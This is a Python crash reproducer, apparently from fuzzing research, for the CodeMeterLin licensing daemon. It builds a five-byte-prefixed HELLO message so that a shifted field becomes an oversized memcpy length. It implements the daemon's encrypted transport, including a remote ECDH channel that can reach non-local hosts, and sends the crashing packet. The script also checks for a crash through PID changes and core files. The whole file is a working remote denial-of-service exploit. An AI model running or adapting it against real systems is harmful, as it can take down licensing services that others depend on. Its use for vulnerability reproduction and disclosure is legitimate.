#!/usr/bin/env python3
"""Single-packet reproducer for the prefixed-HELLO CodeMeterLin crash.

This file is intentionally verbose because it documents where the crash
originates.

Important separation:

1. The AES/CRC/selector/SAMC framing below is only transport machinery. In
   loopback mode it uses selector 0xa0; in remote mode it uses ECDH init
   followed by selector 0xa1.
2. The actual crash trigger is only a five-byte cleartext prefix inserted
   before a normal HELLO:

       5e 00 00 00 00 || canonical HELLO with a fresh client token

3. After decryption, CodeMeterLin parses the shifted HELLO bytes as if they
   were normal structured fields. The first 16 bytes of the mutated cleartext
   become these little-endian 32-bit words:

       bytes: 5e 00 00 00  00 0a 00 00  00 00 00 00  10 00 00 28
       u32:   0x0000005e  0x00000a00  0x00000000  0x28000010

4. In the crashing cores, the parser copies the fourth word into the parser
   object:

       *(u32 *)(this + 0x68) = 0x28000010

   That value then reaches the copy helper as the memcpy length. At the crash:

       #0 libc __memmove_evex_unaligned_erms
       #1 CodeMeterLin + 0x8f431d
       rbx = 0x28000010

So the origin is not the 0x64 request and not a multi-session race. The crash
starts with the malformed HELLO cleartext layout produced by the five-byte
prefix.
"""

from __future__ import annotations

import argparse
import hashlib
import importlib.util
import os
from pathlib import Path
import socket
import struct
import subprocess
import sys
import time
import zlib

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes


# The reduced mutation. The original high-throughput attribution run found
# HISTORICAL_PREFIX_HEX; the ECDH prefix campaign later showed the filler bytes
# can be zeroed while preserving the same shifted 0x28000010 word and
# CodeMeterLin+0x8f431d crash signature.
#
#   worker_09/ring/iter_00004667/
#   mutation: insert_rand at position 0
#   inserted bytes: 5e355ed6f2
#
# These are intentionally not "magic crypto" bytes. They are just plaintext
# bytes that shift the following canonical HELLO fields into parser slots that
# later feed the copy helper.
DEFAULT_PREFIX_HEX = "5e00000000"
HISTORICAL_PREFIX_HEX = "5e355ed6f2"

# In the deterministic cores, this shifted word is stored at parser object
# offset +0x68 and later appears in rbx as memcpy's length.
EXPECTED_BAD_LEN = 0x28000010

SAMC_HEADER_TAIL = bytes([0x11, 0, 1, 0, 0, 0, 0, 0])


def load_samc(ax_fuzz: Path):
    """Import the existing ax_fuzz SAMC helper module.

    We reuse its known-good crypto/framing helpers and captured canonical
    plaintexts so this reproducer stays focused on the single cleartext
    mutation. The imported helpers provide:

    - CAPTURED_SESSION_C2D[0]: canonical HELLO plaintext
    - substitute_token(...): refreshes the per-session client token
    - encrypt_c2d_frame(...): builds a valid SAMC wire frame
    - recv/decrypt helpers used only for diagnostics
    """
    mod_path = ax_fuzz / "tier1" / "samc_fuzz.py"
    sys.path.insert(0, str(mod_path.parent))
    spec = importlib.util.spec_from_file_location("samc_fuzz", mod_path)
    if spec is None or spec.loader is None:
        raise RuntimeError(f"cannot import {mod_path}")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def codemeter_pid() -> int | None:
    """Return the real CodeMeterLin PID, or None if the daemon is gone."""
    try:
        out = subprocess.check_output(["pgrep", "-x", "CodeMeterLin"], text=True, timeout=1)
    except Exception:
        return None
    pids = [int(tok) for tok in out.split() if tok.isdigit()]
    return pids[0] if pids else None


def is_loopback_target(host: str) -> bool:
    """Best-effort check used only to choose default channel/oracle behavior."""
    return host in {"127.0.0.1", "::1", "localhost"}


def resolve_channel(channel: str, host: str) -> str:
    if channel != "auto":
        return channel
    return "psk" if is_loopback_target(host) else "ecdh"


def recv_exact(sock: socket.socket, n: int, timeout: float) -> bytes:
    sock.settimeout(timeout)
    chunks = bytearray()
    while len(chunks) < n:
        try:
            chunk = sock.recv(n - len(chunks))
        except (ConnectionResetError, BrokenPipeError, socket.timeout, OSError):
            break
        if not chunk:
            break
        chunks.extend(chunk)
    return bytes(chunks)


def send_samc_payload(sock: socket.socket, payload: bytes) -> None:
    """Send one outer samc envelope with the provided selector/cipher payload."""
    header = b"samc" + struct.pack("<I", len(payload)) + SAMC_HEADER_TAIL
    sock.sendall(header + payload)


def recv_samc_payload(sock: socket.socket, timeout: float) -> bytes | None:
    hdr = recv_exact(sock, 16, timeout)
    if len(hdr) != 16 or hdr[:4] != b"samc":
        return None
    body_len = struct.unpack_from("<I", hdr, 4)[0]
    if body_len > 1 << 24:
        return None
    body = recv_exact(sock, body_len, timeout)
    if len(body) != body_len:
        return None
    return body


def cts_swap(ciphertext: bytes) -> bytes:
    """CodeMeter's CBC-CTS form swaps the last two complete blocks."""
    if len(ciphertext) >= 32 and len(ciphertext) % 16 == 0:
        return ciphertext[:-32] + ciphertext[-16:] + ciphertext[-32:-16]
    return ciphertext


def derive_ecdh_key_iv(shared: bytes) -> tuple[bytes, bytes]:
    digest = hashlib.sha256(shared + b"\x00\x00\x00\x01").digest()
    return digest[:16], digest[16:32]


def do_ecdh_handshake(sock: socket.socket, timeout: float) -> tuple[bytes, bytes, bytes]:
    """Run the remote-accepted ECDH selector exchange and return key/iv."""
    private_key = ec.generate_private_key(ec.SECP224R1(), default_backend())
    public_numbers = private_key.public_key().public_numbers()
    client_point = (
        b"\x04"
        + public_numbers.x.to_bytes(28, "big")
        + public_numbers.y.to_bytes(28, "big")
    )

    send_samc_payload(sock, b"\xa2\x05" + client_point)
    response = recv_samc_payload(sock, timeout)
    if response is None:
        raise ConnectionError("no ECDH response")
    if len(response) < 65:
        raise ConnectionError(f"short ECDH response: {len(response)} bytes")
    if response[8] != 0x04:
        raise ConnectionError(f"unexpected ECDH point marker: 0x{response[8]:02x}")

    server_x = int.from_bytes(response[9:37], "big")
    server_y = int.from_bytes(response[37:65], "big")
    server_public = ec.EllipticCurvePublicNumbers(
        server_x, server_y, ec.SECP224R1(),
    ).public_key(default_backend())
    shared = private_key.exchange(ec.ECDH(), server_public)
    key, iv = derive_ecdh_key_iv(shared)
    return key, iv, response


def build_ecdh_mac_suffix(plaintext: bytes) -> bytes:
    """Append the ECDH-channel length/CRC tail around arbitrary app bytes.

    Unlike the loopback PSK path, the ECDH channel CRC covers the padded
    plaintext plus the data_len field, i.e. every byte except the CRC itself.
    """
    aligned = ((len(plaintext) + 16) + 15) & ~15
    if aligned < 32:
        aligned = 32
    pad_len = aligned - len(plaintext) - 8
    body = plaintext + (b"\x00" * pad_len) + struct.pack("<I", len(plaintext))
    return body + struct.pack("<I", zlib.crc32(body) & 0xFFFFFFFF)


def encrypt_ecdh_payload(plaintext: bytes, key: bytes, iv: bytes) -> bytes:
    full_plaintext = build_ecdh_mac_suffix(plaintext)
    encryptor = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
    ciphertext = encryptor.update(full_plaintext) + encryptor.finalize()
    return b"\xa1" + cts_swap(ciphertext)


def decrypt_ecdh_response(payload: bytes | None, key: bytes, iv: bytes) -> bytes | None:
    if payload is None or len(payload) < 16 or len(payload) % 16 != 0:
        return None
    decryptor = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
    plaintext = decryptor.update(cts_swap(payload)) + decryptor.finalize()
    if len(plaintext) < 8:
        return None
    data_len = struct.unpack_from("<I", plaintext, len(plaintext) - 8)[0]
    crc = struct.unpack_from("<I", plaintext, len(plaintext) - 4)[0]
    if data_len > len(plaintext) - 8:
        return None
    if (zlib.crc32(plaintext[:-4]) & 0xFFFFFFFF) != crc:
        return None
    return plaintext[:data_len]


def newest_core() -> tuple[str, int, int] | None:
    """Return the newest local CodeMeter core-like file.

    The local test host writes full raw cores to /var/tmp/cm_cores. Some older
    runs also used systemd-coredump. Checking both makes the crash oracle less
    dependent on host setup.
    """
    paths = []
    for root in (Path("/var/tmp/cm_cores"), Path("/var/lib/systemd/coredump")):
        if root.exists():
            paths.extend(root.glob("*CodeMeterLin*"))
    if not paths:
        return None
    path = max(paths, key=lambda p: p.stat().st_mtime_ns)
    st = path.stat()
    return str(path), st.st_mtime_ns, st.st_size


def u32_words(data: bytes, count: int = 4) -> list[int]:
    """Decode the first few little-endian u32 words for human inspection."""
    words = []
    for off in range(0, min(len(data), count * 4), 4):
        if off + 4 <= len(data):
            words.append(struct.unpack_from("<I", data, off)[0])
    return words


def print_plaintext_explanation(canonical_hello: bytes, mutated_hello: bytes,
                                prefix: bytes, token: bytes) -> None:
    """Print the byte-level reason this HELLO is expected to crash."""
    words = u32_words(mutated_hello, 4)
    print("=== cleartext mutation ===")
    print(f"prefix_hex={prefix.hex()}")
    print(f"prefix_len={len(prefix)}")
    print(f"fresh_client_token={token.hex()}")
    print(f"canonical_hello_len={len(canonical_hello)}")
    print(f"mutated_hello_len={len(mutated_hello)}")
    print(f"canonical_hello_head={canonical_hello[:16].hex()}")
    print(f"mutated_hello_head={mutated_hello[:16].hex()}")
    print("mutated_hello_first_u32_le=" + ",".join(f"0x{w:08x}" for w in words))
    if len(words) >= 4:
        print(f"word_at_cleartext_offset_0x0c=0x{words[3]:08x}")
        print(f"expected_bad_memcpy_len=0x{EXPECTED_BAD_LEN:08x}")
        print(f"matches_expected_bad_len={words[3] == EXPECTED_BAD_LEN}")
    print()
    print("Interpretation:")
    print("  The daemon decrypts this as the application HELLO plaintext.")
    print("  The 5-byte prefix shifts the normal HELLO fields.")
    print("  The shifted u32 at cleartext offset 0x0c is 0x28000010.")
    print("  In confirmed cores, the parser stores that value at this+0x68.")
    print("  The copy helper later uses it as memcpy length at CodeMeterLin+0x8f431d.")
    print()


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Send the deterministic prefixed-HELLO crash packet.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=r"""Crash origin, in one line:
  prefixing HELLO with 5e00000000 makes the parser see u32 0x28000010
  at the field that is later copied into this+0x68 and used as memcpy length.

The older captured prefix 5e355ed6f2 reaches the same layout; the default is
the simpler zero-tail form found by the ECDH prefix campaign.

After any required channel setup, this sends only one application frame:
the mutated HELLO. It does not send ACK or 0x64.

For remote/non-loopback targets, --channel auto sends the same mutated
application plaintext over the ECDH-selected channel:
  samc(\xa2\x05 + P-224 point) -> derive key/iv -> samc(\xa1 + ciphertext)
""",
    )
    ap.add_argument("--ax-fuzz", default="/home/avj/clones/ax_fuzz")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=22350)
    ap.add_argument("--channel", choices=["auto", "psk", "ecdh"], default="auto",
                    help="crypto channel: auto uses PSK for loopback, ECDH otherwise")
    ap.add_argument("--prefix", default=DEFAULT_PREFIX_HEX,
                    help="hex bytes to insert before the canonical HELLO")
    ap.add_argument("--connect-timeout", type=float, default=2.0)
    ap.add_argument("--socket-timeout", type=float, default=2.0)
    ap.add_argument("--wait", type=float, default=10.0)
    ap.add_argument("--dry-run", action="store_true",
                    help="build and explain the mutated plaintext but do not connect")
    ap.add_argument("--no-crash-oracle", action="store_true",
                    help="do not inspect the local CodeMeter PID/core state")
    args = ap.parse_args()
    channel = resolve_channel(args.channel, args.host)

    # Load captured plaintexts and crypto helpers from ax_fuzz. This is not
    # where the vulnerability is; it just gives us a correctly encrypted SAMC
    # frame accepted by CodeMeterLin.
    samc = load_samc(Path(args.ax_fuzz))

    # Crash oracle baseline. If the PID changes/disappears or a newer core
    # appears after sending the packet, we count the reproduction as successful.
    local_crash_oracle = not args.no_crash_oracle and is_loopback_target(args.host)
    before_pid = codemeter_pid() if local_crash_oracle else None
    before_core = newest_core() if local_crash_oracle else None

    # CodeMeter rejects replayed HELLO tokens. Refresh the token so the mutated
    # HELLO still reaches the parser instead of being discarded as a replay.
    token = os.urandom(samc.HELLO_TOKEN_LEN)
    canonical_hello = samc.substitute_token(0, samc.CAPTURED_SESSION_C2D[0], token)

    # This is the actual reduced bug trigger:
    #
    #   mutated_hello = 5e00000000 || canonical_hello
    #
    # Everything after this point is just SAMC wire encoding and sending.
    prefix = bytes.fromhex(args.prefix)
    mutated_hello = prefix + canonical_hello

    print("=== daemon baseline ===")
    print(f"target={args.host}:{args.port}")
    print(f"channel={channel}")
    print(f"local_crash_oracle={local_crash_oracle}")
    print(f"before_pid={before_pid}")
    print(f"before_core={before_core}")
    print()
    print_plaintext_explanation(canonical_hello, mutated_hello, prefix, token)
    if args.dry_run:
        print("dry_run=True")
        return 0

    # Build a TCP connection to the live daemon. Remote/non-loopback peers must
    # use the ECDH-selected channel; the time-derived PSK channel is accepted
    # only from loopback.
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(args.connect_timeout)
    sock.connect((args.host, args.port))
    sock.settimeout(args.socket_timeout)
    try:
        if channel == "psk":
            # encrypt_c2d_frame appends the loopback PSK CRC/length tail,
            # encrypts with the time-derived AES key/IV, wraps it in the
            # "samc" wire header, and adds selector 0xa0.
            wire = samc.encrypt_c2d_frame(mutated_hello, int(time.time()))
            print("=== send ===")
            print("selector=0xa0")
            print(f"wire_len={len(wire)}")
            print("sending exactly one mutated HELLO frame")
            sock.sendall(wire)
            try:
                # A crashing run usually has no response: the daemon dies while
                # processing the HELLO. If a response appears, print it for
                # diagnostics and let the PID/core oracle below decide success.
                resp = samc.recv_one_wire_frame(sock, timeout=args.socket_timeout)
                inner = samc.decrypt_d2c_frame(resp, int(time.time())) if resp else None
                print(f"response_wire_len={None if resp is None else len(resp)}")
                print(f"response_inner_len={None if inner is None else len(inner)}")
            except Exception as exc:
                print(f"recv_exception={type(exc).__name__}:{exc}")
        elif channel == "ecdh":
            key, iv, ecdh_response = do_ecdh_handshake(sock, args.socket_timeout)
            payload = encrypt_ecdh_payload(mutated_hello, key, iv)
            print("=== ecdh ===")
            print(f"server_point={ecdh_response[8:65].hex()}")
            print(f"key={key.hex()}")
            print(f"iv={iv.hex()}")
            print()
            print("=== send ===")
            print("selector=0xa1")
            print(f"wire_len={16 + len(payload)}")
            print(f"encrypted_payload_len={len(payload)}")
            print("sending exactly one ECDH-channel mutated HELLO frame")
            send_samc_payload(sock, payload)
            try:
                response_payload = recv_samc_payload(sock, args.socket_timeout)
                response_inner = decrypt_ecdh_response(response_payload, key, iv)
                print(f"response_payload_len={None if response_payload is None else len(response_payload)}")
                print(f"response_inner_len={None if response_inner is None else len(response_inner)}")
                if response_inner is not None:
                    print(f"response_inner_head={response_inner[:64].hex()}")
            except Exception as exc:
                print(f"recv_exception={type(exc).__name__}:{exc}")
        else:
            raise AssertionError(f"unexpected channel: {channel}")
    finally:
        sock.close()

    if not local_crash_oracle:
        print()
        print("=== crash oracle ===")
        print("local_crash_oracle=False")
        print("No local PID/core check was run for this target.")
        return 0

    deadline = time.time() + args.wait
    while time.time() < deadline:
        after_pid = codemeter_pid()
        after_core = newest_core()
        if after_pid != before_pid or after_core != before_core:
            break
        time.sleep(0.25)

    after_pid = codemeter_pid()
    after_core = newest_core()
    crashed = after_pid != before_pid or after_core != before_core
    print()
    print("=== crash oracle ===")
    print(f"after_pid={after_pid}")
    print(f"after_core={after_core}")
    print(f"crashed={crashed}")
    if crashed:
        print()
        print("Expected GDB facts for the resulting core:")
        print("  #1 CodeMeterLin + 0x8f431d")
        print("  rbx = 0x28000010")
        print("  parsed buffer +0x0c = 0x28000010")
        print("  parser object this+0x68 = 0x28000010")
    return 0 if crashed else 1


if __name__ == "__main__":
    raise SystemExit(main())
